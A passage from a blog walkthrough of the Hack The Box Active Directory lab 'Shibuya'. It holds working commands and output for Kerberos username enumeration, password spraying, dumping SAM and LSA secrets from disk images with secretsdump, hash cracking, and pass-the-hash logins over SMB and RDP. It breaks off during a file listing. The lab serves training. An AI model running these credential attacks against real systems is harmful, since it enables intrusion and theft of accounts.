---
title: Shibuya
date: 2026-01-20
ShowToc: true
TocOpen: true
tags:
  - blog
  - netexec
  - smb-username-collect
  - kerberbrute
  - smb-description
  - netexec-kerberos-auth
  - wim
  - netexec-spider
  - SAM-SYSTEM-SECUITY
  - SAM-SYSTEM-SECUITY-hashcrack
  - netexec-users-hashs
  - smb-login-with-hash
  - smb-to-ssh
  - windows-Firewall-Enumeration
  - HTB
  - windows
  - hard
  - bloodhound-HasSession
lastmod: 2026-02-28T07:50:44.804Z
---
# Box  Info

{{< htb-info "https://www.hackthebox.com/machines/shibuya" >}}

***

# Recon 10.129.234.42

### PORT & IP SCAN

A Standard Windows AD Server , with the kerberos auth , also the ldap query , and the 3389 port show that the domain `AWSJPDC0522.shibuya.vl` ,but the ldap anonymous inquiry failed .

```shell
└─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 10.129.234.42 -oN serviceScan.txt
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-20 15:59 +0800
Nmap scan report for 10.129.234.42
Host is up (0.049s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-20 07:59:19Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: shibuya.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:AWSJPDC0522.shibuya.vl
| Not valid before: 2026-01-20T07:44:52
|_Not valid after:  2027-01-20T07:44:52
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shibuya.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:AWSJPDC0522.shibuya.vl
| Not valid before: 2026-01-20T07:44:52
|_Not valid after:  2027-01-20T07:44:52
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
| Not valid before: 2026-01-19T07:54:00
|_Not valid after:  2026-07-21T07:54:00
| rdp-ntlm-info: 
|   Target_Name: SHIBUYA
|   NetBIOS_Domain_Name: SHIBUYA
|   NetBIOS_Computer_Name: AWSJPDC0522
|   DNS_Domain_Name: shibuya.vl
|   DNS_Computer_Name: AWSJPDC0522.shibuya.vl
|   DNS_Tree_Name: shibuya.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-20T08:00:08+00:00
|_ssl-date: 2026-01-20T08:00:48+00:00; 0s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
52154/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
58538/tcp open  msrpc         Microsoft Windows RPC
58557/tcp open  msrpc         Microsoft Windows RPC
62625/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: AWSJPDC0522; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-01-20T08:00:09
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.94 seconds

```

### DNS

{{< toggle "Tag 🏷️" >}}

{{< tag "netexec" >}}  The netexec will auto generate the  file for you to add into the /etc/hosts

{{< /toggle >}}

only the `netexec smb 10.129.32.246  --generate-hosts-file hosts` is dont work , you have to add into the `/etc/host` and successfully ping it ;otherwise, you cant login it , Also you need to use the `-k` in netexec to login

```shell
└─# ping shibuya.vl
PING AWSJPDC0522.shibuya.vl (10.129.32.246) 56(84) bytes of data.
64 bytes from AWSJPDC0522.shibuya.vl (10.129.32.246): icmp_seq=1 ttl=127 time=44.1 ms
64 bytes from AWSJPDC0522.shibuya.vl (10.129.32.246): icmp_seq=2 ttl=127 time=43.8 ms
^C64 bytes from AWSJPDC0522.shibuya.vl (10.129.32.246): icmp_seq=3 ttl=127 time=45.2 ms
64 bytes from AWSJPDC0522.shibuya.vl (10.129.32.246): icmp_seq=4 ttl=127 time=44.5 ms
^C
--- AWSJPDC0522.shibuya.vl ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 43.763/44.372/45.152/0.516 ms
                                                                                          
┌──(haydon_env)─(root㉿kali)-[~/Desktop/10.129.32.246]
└─# netexec smb shibuya.vl   -u ./valid_users.txt  -p ./valid_users.txt --no-bruteforce --continue-on-success -k   
SMB         shibuya.vl      445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         shibuya.vl      445    AWSJPDC0522      [+] shibuya.vl\purple:purple 
SMB         shibuya.vl      445    AWSJPDC0522      [+] shibuya.vl\red:red                                                                                          
```

### SMB 445 --Scan

{{< toggle "Tag 🏷️" >}}

{{< tag "smb-username-collect" >}}  when the windows smb share the home directory it will possible show the users 's name .

{{< /toggle >}}\
Don’t get too much information form here ;Howevr,we got the `homes` directory which show the username

```
└─# nxc smb 10.129.234.42/24 -u 'guest' -p '' --shares
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.48   445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.71   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.42   445    AWSJPDC0522      [-] shibuya.vl\guest: STATUS_ACCOUNT_DISABLED 
SMB         10.129.234.48   445    DC-JPQ225        [-] cicada.vl\guest: STATUS_NOT_SUPPORTED 
SMB         10.129.234.72   445    DC               [+] baby2.vl\guest: 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\guest: STATUS_ACCOUNT_DISABLED 
SMB         10.129.234.72   445    DC               [*] Enumerated shares
SMB         10.129.234.72   445    DC               Share           Permissions     Remark
SMB         10.129.234.72   445    DC               -----           -----------     ------
SMB         10.129.234.72   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.72   445    DC               apps            READ            
SMB         10.129.234.72   445    DC               C$                              Default share
SMB         10.129.234.72   445    DC               docs                            
SMB         10.129.234.72   445    DC               homes           READ,WRITE      
SMB         10.129.234.72   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.72   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.234.72   445    DC               SYSVOL                          Logon server share 
SMB         10.129.234.73   445    JOB              [*] Windows Server 2022 Build 20348 (name:JOB) (domain:job) (signing:False) (SMBv1:None)
SMB         10.129.234.64   445    LOCK             [*] Windows Server 2022 Build 20348 (name:LOCK) (domain:Lock) (signing:False) (SMBv1:None)
SMB         10.129.234.73   445    JOB              [-] job\guest: STATUS_ACCOUNT_DISABLED 
SMB         10.129.234.64   445    LOCK             [-] Lock\guest: STATUS_ACCOUNT_DISABLED 
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00                                                                                        
```

# Shell as red

### kerbrute

{{< toggle "Tag 🏷️" >}}

{{< tag "kerberbrute" >}} have the usernames list from smb share , also add the xato-net-10-million-usernames.txt list , so kerbrute verify the user of purple and red

{{< /toggle >}}

download the xato-net-10-million-usernames.txt

```
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/xato-net-10-million-usernames.txt
```

Use the xato-net-10-million and the smb share usernames to successfully find the account red by [kerbrute](https://github.com/ropnop/kerbrute)

```shell
└─# ../kerbrute_dev userenum --dc 10.129.32.246 -d shibuya.vl ./xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                   

Version: dev (23a0358) - 01/21/26 - Ronnie Flathers @ropnop

2026/01/21 10:19:32 >  Using KDC(s):
2026/01/21 10:19:32 >   10.129.32.246:88

2026/01/21 10:19:33 >  [+] VALID USERNAME:       purple@shibuya.vl
2026/01/21 10:19:36 >  [+] VALID USERNAME:       red@shibuya.vl
2026/01/21 10:20:18 >  [+] VALID USERNAME:       Purple@shibuya.vl
2026/01/21 10:20:49 >  [+] VALID USERNAME:       Red@shibuya.vl              
2026/01/21 10:21:34 >  [+] VALID USERNAME:       RED@shibuya.vl              
2026/01/21 10:21:34 >  [+] VALID USERNAME:       PURPLE@shibuya.vl 
```

Active Directory usernames (sAMAccountName) are case-insensitive during validation and existence checks. Therefore, purple and Purple (as well as other case variants like pUrPlE) all refer to the same single user account.

```
purple
red
```

I will the the Same account name and same password ,also try the Cipher Transformation if need ,but I successfully find the account of red  : red by

```shell
./kerbrute_dev passwordspray -d shibuya.vl --dc 10.129.32.246 valid_users.txt passwords.txt
```

{{< toggle "Tag 🏷️" >}}

{{< tag "netexec-kerberos-auth" >}} smb need the kerberos auth with -k

{{< /toggle >}}

{{< toggle "Tag 🏷️" >}}

{{< tag "smb-description" >}} The smb Description show something like the password

{{< /toggle >}}

Successfully login ,but need to use the -k of kerberos auth ,and the Description show the something like the password of K5\&A6Dw9d8jrKWhV

```
└─# netexec smb shibuya.vl   -u 'red'  -p 'red'  -k  --users            
SMB         shibuya.vl      445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         shibuya.vl      445    AWSJPDC0522      [+] shibuya.vl\red:red 
SMB         shibuya.vl      445    AWSJPDC0522      -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         shibuya.vl      445    AWSJPDC0522      _admin                        2025-02-15 07:55:29 0       Built-in account for administering the computer/domain 
SMB         shibuya.vl      445    AWSJPDC0522      Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         shibuya.vl      445    AWSJPDC0522      krbtgt                        2025-02-15 07:24:57 0       Key Distribution Center Service Account 
SMB         shibuya.vl      445    AWSJPDC0522      svc_autojoin                  2025-02-15 07:51:49 0       K5&A6Dw9d8jrKWhV 
SMB         shibuya.vl      445    AWSJPDC0522      Leon.Warren                   2025-02-16 10:23:34 0        
...
snip
...

```

# Shell as svc\_autojoin

```
┌──(haydon_env)─(root㉿kali)-[~/vpn]
└─# netexec smb shibuya.vl   -u 'svc_autojoin'  -p 'K5&A6Dw9d8jrKWhV'   -k  --shares
SMB         shibuya.vl      445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         shibuya.vl      445    AWSJPDC0522      [+] shibuya.vl\svc_autojoin:K5&A6Dw9d8jrKWhV 
SMB         shibuya.vl      445    AWSJPDC0522      [*] Enumerated shares
SMB         shibuya.vl      445    AWSJPDC0522      Share           Permissions     Remark
SMB         shibuya.vl      445    AWSJPDC0522      -----           -----------     ------
SMB         shibuya.vl      445    AWSJPDC0522      ADMIN$                          Remote Admin
SMB         shibuya.vl      445    AWSJPDC0522      C$                              Default share
SMB         shibuya.vl      445    AWSJPDC0522      images$         READ            
SMB         shibuya.vl      445    AWSJPDC0522      IPC$            READ            Remote IPC
SMB         shibuya.vl      445    AWSJPDC0522      NETLOGON        READ            Logon server share 
SMB         shibuya.vl      445    AWSJPDC0522      SYSVOL          READ            Logon server share 
SMB         shibuya.vl      445    AWSJPDC0522      users           READ            
                                                                                                                        
```

{{< toggle "Tag 🏷️" >}}

{{< tag "netexec-spider" >}}  [reference](https://www.netexec.wiki/smb-protocol/spidering-shares)  find the folder of 'images\$' 's all file --regex into local machine

{{< /toggle >}}

The shares of `images$` dont have it before, so i will use the ` --spider 'folder' --regex .` and found the `wim` which is something like the `iso` stuff , after google , i am able to use the `wimtools`  to mount it

```
└─# netexec smb shibuya.vl   -u 'svc_autojoin'  -p 'K5&A6Dw9d8jrKWhV' -k --spider 'images$' --regex .
SMB         shibuya.vl      445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         shibuya.vl      445    AWSJPDC0522      [+] shibuya.vl\svc_autojoin:K5&A6Dw9d8jrKWhV 
SMB         shibuya.vl      445    AWSJPDC0522      [*] Spidering .
SMB         shibuya.vl      445    AWSJPDC0522      //shibuya.vl/images$/. [dir]
SMB         shibuya.vl      445    AWSJPDC0522      //shibuya.vl/images$/.. [dir]
SMB         shibuya.vl      445    AWSJPDC0522      //shibuya.vl/images$/AWSJPWK0222-01.wim [lastm:'2025-02-20 01:35' size:8264070]
SMB         shibuya.vl      445    AWSJPDC0522      //shibuya.vl/images$/AWSJPWK0222-02.wim [lastm:'2025-02-20 01:35' size:50660968]
SMB         shibuya.vl      445    AWSJPDC0522      //shibuya.vl/images$/AWSJPWK0222-03.wim [lastm:'2025-02-20 01:35' size:32065850]
SMB         shibuya.vl      445    AWSJPDC0522      //shibuya.vl/images$/vss-meta.cab [lastm:'2025-02-20 01:35' size:365686]

```

### wimtools

{{< toggle "Tag 🏷️" >}}

{{< tag "wim" >}}  the (Windows Imaging) wim file something like the iso file that was introduced in Windows Vista. It is primarily used to capture, to modify, and to apply file-based disk images for rapid deployment . There it can read by wimtools tools

{{< /toggle >}}

```
sudo apt update
sudo apt install wimtools
```

```
mkdir /mnt/htb
sudo wimmount AWSJPWK0222-01.wim 1 /mnt/htb
```

```
mkdir /mnt/htb1
sudo wimmount AWSJPWK0222-02.wim 1 /mnt/htb1
```

```
mkdir /mnt/htb2
sudo wimmount AWSJPWK0222-03.wim 1 /mnt/htb2
```

```
└─# ls
hgfs  htb  htb1  htb2
```

{{< toggle "Tag 🏷️" >}}

{{< tag "SAM-SYSTEM-SECUITY" >}}  SAM : stores locally cached credentials (referred to as SAM secrets) , SECURITY : stores domain cached credentials (referred to as LSA secrets) , SYSTEM : contains enough info to decrypt SAM secrets and LSA secrets . Therefore use the secretsdump.py to get the hash

{{< /toggle >}}

Found the `SAM` , `SYSTEM` , `SECUITY` ,so need to copy the editable place .

```
┌──(haydon_env)─(root㉿kali)-[/mnt/htb1]
└─# cp ./SAM ~/Desktop/10.129.32.246
                                                                                                                                                              
┌──(haydon_env)─(root㉿kali)-[/mnt/htb1]
└─# cp ./SYSTEM ~/Desktop/10.129.32.246


┌──(haydon_env)─(root㉿kali)-[/mnt/htb1]
└─# cp ./SECURITY ~/Desktop/10.129.32.246


```

`secretsdump.py` usage , found a lot of hash , i will put in the `crackstation` for review

```
└─# secretsdump.py -sam ./SAM -system ./SYSTEM LOCAL  -security SECURITY
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x2e971736685fc53bfd5106d471e2f00f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8dcb5ed323d1d09b9653452027e8c013:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9dc1b36c1e31da7926d77ba67c654ae6:::
operator:1000:aad3b435b51404eeaad3b435b51404ee:5d8c3d1a20bd63f60f469f6763ca0d50:::
[*] Dumping cached domain logon information (domain/username:hash)
SHIBUYA.VL/Simon.Watson:$DCC2$10240#Simon.Watson#04b20c71b23baf7a3025f40b3409e325: (2025-02-16 11:17:56+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:2f006b004e0045004c0045003f0051005800290040004400580060005300520079002600610027002f005c002e002e0053006d0037002200540079005e0044003e004e0056005f00610063003d00270051002e00780075005b0075005c00410056006e004200230066004a0029006f007a002a005700260031005900450064003400240035004b0079004d006f004f002100750035005e0043004e002500430050006e003a00570068005e004e002a0076002a0043005a006c003d00640049002e006d005a002d002d006e0056002000270065007100330062002f00520026006b00690078005b003600670074003900
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:1fe837c138d1089c9a0763239cd3cb42
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb31a4d81f2df440f806871a8b5f53a15de12acc1
dpapi_userkey:0xe14c10978f8ee226cbdbcbee9eac18a28b006d06
[*] NL$KM 
 0000   92 B9 89 EF 84 2F D6 55  73 67 31 8F E0 02 02 66   ...../.Usg1....f
 0010   F9 81 42 68 8C 3B DF 5D  0A E5 BA F2 4A 2C 43 0E   ..Bh.;.]....J,C.
 0020   1C C5 4F 40 1E F5 98 38  2F A4 17 F3 E9 D9 23 E3   ..O@...8/.....#.
 0030   D1 49 FE 06 B3 2C A1 1A  CB 88 E4 1D 79 9D AE 97   .I...,......y...
NL$KM:92b989ef842fd6557367318fe0020266f98142688c3bdf5d0ae5baf24a2c430e1cc54f401ef598382fa417f3e9d923e3d149fe06b32ca11acb88e41d799dae97
[*] Cleaning up... 
                                                                                                                                               
```

{{< toggle "Tag 🏷️" >}}

{{< tag "SAM-SYSTEM-SECUITY-hashcrack" >}}  Using the online platform of crackstation to get the hash

{{< /toggle >}}

The crackstation show that only have one hash is successful (2 is the same)\
![Pasted image 20260121155534.png](/ob/Pasted%20image%2020260121155534.png)

# Shell as Simon.Watson

```
└─# cat tmp.txt |  awk -F: '{print $1, $NF}'            
Administrator 
Guest 
DefaultAccount 
WDAGUtilityAccount 
operator 
[*] Dumping cached domain logon information (domain/username hash)
SHIBUYA.VL/Simon.Watson 
                                                                                                                                                                                                     
┌──(haydon_env)─(root㉿kali)-[~/Desktop/10.129.32.246]
└─# cat tmp.txt |  awk -F: '{print $1, $NF}'  > user_list


└─# cat user_list 
Administrator 
Guest 
DefaultAccount 
WDAGUtilityAccount 
operator 
Simon.Watson 

```

{{< toggle "Tag 🏷️" >}}

{{< tag "netexec-users-hashs" >}}  Burte-force with the username and the hashes by netexec

{{< /toggle >}}

Burte-force with the username and the hashes

```
└─# netexec smb shibuya.vl   -u ./user_list  -H ./hashes.txt                         
SMB         10.129.32.246   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.32.246   445    AWSJPDC0522      [-] shibuya.vl\Administrator:8dcb5ed323d1d09b9653452027e8c013 STATUS_LOGON_FAILURE 
SMB         10.129.32.246   445    AWSJPDC0522      [-] shibuya.vl\Guest:8dcb5ed323d1d09b9653452027e8c013 STATUS_LOGON_FAILURE 
SMB         10.129.32.246   445    AWSJPDC0522      [-] shibuya.vl\DefaultAccount:8dcb5ed323d1d09b9653452027e8c013 STATUS_LOGON_FAILURE 
SMB         10.129.32.246   445    AWSJPDC0522      [-] shibuya.vl\WDAGUtilityAccount:8dcb5ed323d1d09b9653452027e8c013 STATUS_LOGON_FAILURE 
SMB         10.129.32.246   445    AWSJPDC0522      [-] shibuya.vl\operator:8dcb5ed323d1d09b9653452027e8c013 STATUS_LOGON_FAILURE 
SMB         10.129.32.246   445    AWSJPDC0522      [-] shibuya.vl\Simon.Watson:8dcb5ed323d1d09b9653452027e8c013 STATUS_LOGON_FAILURE 
SMB         10.129.32.246   445    AWSJPDC0522      [-] shibuya.vl\Administrator:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE 
SMB         10.129.32.246   445    AWSJPDC0522      [-] shibuya.vl\Guest:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_ACCOUNT_DISABLED 
SMB         10.129.32.246   445    AWSJPDC0522      [-] shibuya.vl\DefaultAccount:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE 
SMB         10.129.32.246   445    AWSJPDC0522      [-] shibuya.vl\WDAGUtilityAccount:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE 
SMB         10.129.32.246   445    AWSJPDC0522      [-] shibuya.vl\operator:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE 
SMB         10.129.32.246   445    AWSJPDC0522      [-] shibuya.vl\Simon.Watson:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE 
SMB         10.129.32.246   445    AWSJPDC0522      [-] shibuya.vl\Administrator:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE 
SMB         10.129.32.246   445    AWSJPDC0522      [-] shibuya.vl\Guest:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_ACCOUNT_DISABLED 
SMB         10.129.32.246   445    AWSJPDC0522      [-] shibuya.vl\DefaultAccount:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE 
SMB         10.129.32.246   445    AWSJPDC0522      [-] shibuya.vl\WDAGUtilityAccount:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE 
SMB         10.129.32.246   445    AWSJPDC0522      [-] shibuya.vl\operator:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE 
SMB         10.129.32.246   445    AWSJPDC0522      [-] shibuya.vl\Simon.Watson:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE 
SMB         10.129.32.246   445    AWSJPDC0522      [-] shibuya.vl\Administrator:9dc1b36c1e31da7926d77ba67c654ae6 STATUS_LOGON_FAILURE 
SMB         10.129.32.246   445    AWSJPDC0522      [-] shibuya.vl\Guest:9dc1b36c1e31da7926d77ba67c654ae6 STATUS_LOGON_FAILURE 
SMB         10.129.32.246   445    AWSJPDC0522      [-] shibuya.vl\DefaultAccount:9dc1b36c1e31da7926d77ba67c654ae6 STATUS_LOGON_FAILURE 
SMB         10.129.32.246   445    AWSJPDC0522      [-] shibuya.vl\WDAGUtilityAccount:9dc1b36c1e31da7926d77ba67c654ae6 STATUS_LOGON_FAILURE 
SMB         10.129.32.246   445    AWSJPDC0522      [-] shibuya.vl\operator:9dc1b36c1e31da7926d77ba67c654ae6 STATUS_LOGON_FAILURE 
SMB         10.129.32.246   445    AWSJPDC0522      [-] shibuya.vl\Simon.Watson:9dc1b36c1e31da7926d77ba67c654ae6 STATUS_LOGON_FAILURE 
SMB         10.129.32.246   445    AWSJPDC0522      [-] shibuya.vl\Administrator:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.129.32.246   445    AWSJPDC0522      [-] shibuya.vl\Guest:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.129.32.246   445    AWSJPDC0522      [-] shibuya.vl\DefaultAccount:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.129.32.246   445    AWSJPDC0522      [-] shibuya.vl\WDAGUtilityAccount:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.129.32.246   445    AWSJPDC0522      [-] shibuya.vl\operator:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.129.32.246   445    AWSJPDC0522      [+] shibuya.vl\Simon.Watson:5d8c3d1a20bd63f60f469f6763ca0d50 
                                                                                                                                                                                                     
┌──(haydon_env)─(root㉿kali)-[~/Desktop/10.129.32.246]
└─# cat hashes.txt 
8dcb5ed323d1d09b9653452027e8c013
31d6cfe0d16ae931b73c59d7e0c089c0
31d6cfe0d16ae931b73c59d7e0c089c0
9dc1b36c1e31da7926d77ba67c654ae6
5d8c3d1a20bd63f60f469f6763ca0d50
04b20c71b23baf7a3025f40b3409e325
1fe837c138d1089c9a0763239cd3cb42

```

{{< toggle "Tag 🏷️" >}}

{{< tag "smb-login-with-hash" >}}  although the netexec can show the info with hashes , but only the smbclient can interact the file with hashes

{{< /toggle >}}

`Simon.Watson` and `5d8c3d1a20bd63f60f469f6763ca0d50` success

login the  Simon.Watson with the smbclient

```
 smbclient -U Simon.Watson --pw-nt-hash //shibuya.vl/users 5d8c3d1a20bd63f60f469f6763ca0d50
```

```
└─# netexec rdp  shibuya.vl   -u Simon.Watson   -H 5d8c3d1a20bd63f60f469f6763ca0d50      
RDP         10.129.32.246   3389   AWSJPDC0522      [*] Windows 10 or Windows Server 2016 Build 20348 (name:AWSJPDC0522) (domain:shibuya.vl) (nla:True)
RDP         10.129.32.246   3389   AWSJPDC0522      [+] shibuya.vl\Simon.Watson:5d8c3d1a20bd63f60f469f6763ca0d50 

```

```
┌──(haydon_env)─(root㉿kali)-[~/Desktop/10.129.32.246]
└─# netexec smb shibuya.vl   -u Simon.Watson   -H 5d8c3d1a20bd63f60f469f6763ca0d50  --shares
SMB         10.129.32.246   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.32.246   445    AWSJPDC0522      [+] shibuya.vl\Simon.Watson:5d8c3d1a20bd63f60f469f6763ca0d50 
SMB         10.129.32.246   445    AWSJPDC0522      [*] Enumerated shares
SMB         10.129.32.246   445    AWSJPDC0522      Share           Permissions     Remark
SMB         10.129.32.246   445    AWSJPDC0522      -----           -----------     ------
SMB         10.129.32.246   445    AWSJPDC0522      ADMIN$                          Remote Admin
SMB         10.129.32.246   445    AWSJPDC0522      C$                              Default share
SMB         10.129.32.246   445    AWSJPDC0522      images$         READ            
SMB         10.129.32.246   445    AWSJPDC0522      IPC$            READ            Remote IPC
SMB         10.129.32.246   445    AWSJPDC0522      NETLOGON        READ            Logon server share 
SMB         10.129.32.246   445    AWSJPDC0522      SYSVOL          READ            Logon server share 
SMB         10.129.32.246   445    AWSJPDC0522      users           READ                                                                                                        
```

```
                                                    
┌──(haydon_env)─(root㉿kali)-[~/Desktop/10.129.32.246]
└─#  smbclient -U Simon.Watson --pw-nt-hash //shibuya.vl/users 5d8c3d1a20bd63f60f469f6763ca0d50
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Feb 16 18:42:24 2025
  ..                                DHS        0  Wed Apr  9 08:09:45 2025
  Administrator                       D        0  Wed Apr  9 07:36:27 2025
  All Users                       DHSrn        0  Sat May  8 16:34:03 2021
  Default                           DHR        0  Sat Feb 15 23:49:13 2025
  Default User                    DHSrn        0  Sat May  8 16:34:03 2021
  desktop.ini                       AHS      174  Sat May  8 16:18:31 2021
  nigel.mills                         D        0  Wed Apr  9 07:30:42 2025
  Public                             DR        0  Sat Feb 15 14:49:31 2025
  simon.watson                        D        0  Wed Feb 19 03:36:45 2025

                5048575 blocks of size 4096. 1533503 blocks available
smb: \> cd simon.watson
smb: \simon.watson\> ls
  .                                   D        0  Wed Feb 19 03:36:45 2025
  ..                                 DR        0  Sun Feb 16 18:42:24 2025
  AppData                            DH        0  Sun Feb 16 18:42:06 2025
  Application Data                DHSrn        0  Sun Feb 16 18:42:06 2025
  Cookies                         DHSrn        0  Sun Feb 16 18:42:06 2025
  Desktop                            DR        0  Wed Apr  9 08:06:32 2025
  Documents                          DR        0  Sun Feb 16 18:42:06 2025
  Downloads                          DR        0  Sat May  8 16:20:24 2021
  Favorites                          DR        0  Sat May  8 16:20:24 2021
  Links                              DR        0  Sat May  8 16:20:24 2021
  Local Settings                  DHSrn        0  Sun Feb 16 18:42:06 2025
  Music                              DR        0  Sat May  8 16:20:24 2021
  My Documents                    DHSrn        0  Sun Feb 16 18:42:06 2025
  NetHood                         DHSrn        0  Sun Feb 16 18:42:06 2025
  NTUSER.DAT                        AHn   262144  Wed Apr  9 07:37:56 2025
  ntuser.dat.LOG1                   AHS        0  Sun Feb 16 18:42:06 2025
  ntuser.dat.LOG2                   AHS        0  Sun Feb 16 18:42:06 2025
  NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf    AHS    65536  Sun Feb 16 18:42:08 2025
  NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms    AHS   52428
  NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms    AHS   52428
  ntuser.ini                         HS       20  Sun Feb 16 18:42:06 2025
  Pictures                           DR        0  Sat May  8 16:20:24 2021
  PrintHood                       DHSrn        0  Sun Feb 16 18:42:06 2025
  Recent                          DHSrn        0  Sun Feb 16 18:42:06 2025
  Saved Games                        Dn        0  Sat May  8 16:20:24 2021
  SendTo                          DHSrn        0  Sun Feb 16 18:42:06 2025
  Start Menu                      DHSrn        0  Sun Feb 16 18:42:06 2025
